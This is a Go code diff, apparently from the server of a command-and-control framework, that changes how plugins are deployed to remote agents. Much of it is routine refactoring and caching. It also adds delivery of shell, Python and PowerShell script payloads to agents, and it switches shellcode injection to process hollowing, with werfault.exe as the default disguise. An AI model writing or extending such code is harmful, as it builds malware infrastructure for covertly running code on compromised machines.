@@ -6,7 +6,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
 	"log"
 	"os"
 	"path/filepath"
@@ -15,7 +14,12 @@ import (
 	"github.com/google/uuid"
 )
 
-var manifestMutex sync.Mutex
+var (
+	manifestMutex  sync.Mutex
+	cachedManifest []PluginMetadata
+	manifestLoaded bool
+	pluginCache    = make(map[string][]byte)
+)
 
 // PluginMetadata matches the manifest.json structure
 type PluginMetadata struct {
@@ -31,7 +35,11 @@ type PluginMetadata struct {
 
 // loadPluginManifestNoLock reads from disk without locking - internal use only
 func loadPluginManifestNoLock() ([]PluginMetadata, error) {
-	data, err := ioutil.ReadFile("assets/plugins/manifest.json")
+	if manifestLoaded {
+		return cachedManifest, nil
+	}
+
+	data, err := os.ReadFile("assets/plugins/manifest.json")
 	if err != nil {
 		return nil, fmt.Errorf("failed to read plugin manifest: %v", err)
 	}
@@ -40,6 +48,9 @@ func loadPluginManifestNoLock() ([]PluginMetadata, error) {
 	if err := json.Unmarshal(data, &plugins); err != nil {
 		return nil, fmt.Errorf("failed to parse plugin manifest: %v", err)
 	}
+
+	cachedManifest = plugins
+	manifestLoaded = true
 	return plugins, nil
 }
 
@@ -71,10 +82,20 @@ func DeployPlugin(agentID string, pluginID string, args string) (string, error) 
 	}
 
 	// 2. 读取插件文件
-	pluginPath := filepath.Join("assets/plugins", meta.FileName)
-	binData, err := os.ReadFile(pluginPath)
-	if err != nil {
-		return "", fmt.Errorf("failed to read plugin: %v", err)
+	manifestMutex.Lock()
+	binData, ok := pluginCache[pluginID]
+	manifestMutex.Unlock()
+
+	if !ok {
+		pluginPath := filepath.Join("assets/plugins", meta.FileName)
+		var err error
+		binData, err = os.ReadFile(pluginPath)
+		if err != nil {
+			return "", fmt.Errorf("failed to read plugin: %v", err)
+		}
+		manifestMutex.Lock()
+		pluginCache[pluginID] = binData
+		manifestMutex.Unlock()
 	}
 
 	// 3. 映射到 Agent 的内部指令
@@ -98,10 +119,16 @@ func DeployPlugin(agentID string, pluginID string, args string) (string, error) 
 		content = fmt.Sprintf("%s|%s", args, base64.StdEncoding.EncodeToString(binData))
 	case "powershell-script":
 		cmdType = "powershell_script"
-		content = args
+		content = fmt.Sprintf("%s|%s", args, string(binData))
+	case "shell-script":
+		cmdType = "shell_script"
+		content = fmt.Sprintf("%s|%s", args, string(binData))
+	case "python-script":
+		cmdType = "python_script"
+		content = fmt.Sprintf("%s|%s", args, string(binData))
 	case "shellcode-inject":
-		cmdType = "inject_shellcode"
-		// 格式: pid|base64_data
+		cmdType = "hollow_shellcode"
+		// 格式: target_exe|base64_data (如果args为空，客户端会默认使用werfault.exe)
 		content = fmt.Sprintf("%s|%s", args, base64.StdEncoding.EncodeToString(binData))
 	case "wasm-skill":
 		cmdType = "wasm_exec"
@@ -169,7 +196,12 @@ func AddPluginToManifest(plugin PluginMetadata) error {
 		return err
 	}
 
-	return ioutil.WriteFile("assets/plugins/manifest.json", data, 0644)
+	err = os.WriteFile("assets/plugins/manifest.json", data, 0644)
+	if err == nil {
+		cachedManifest = manifest
+		manifestLoaded = true
+	}
+	return err
 }
 
 // RemovePluginFromManifest removes plugin metadata from manifest.json
@@ -204,9 +236,13 @@ func RemovePluginFromManifest(pluginID string) (string, error) {
 		return "", err
 	}
 
-	if err := ioutil.WriteFile("assets/plugins/manifest.json", data, 0644); err != nil {
+	if err := os.WriteFile("assets/plugins/manifest.json", data, 0644); err != nil {
 		return "", err
 	}
+	
+	cachedManifest = updated
+	manifestLoaded = true
+	delete(pluginCache, pluginID)
 
 	return fileName, nil
 }
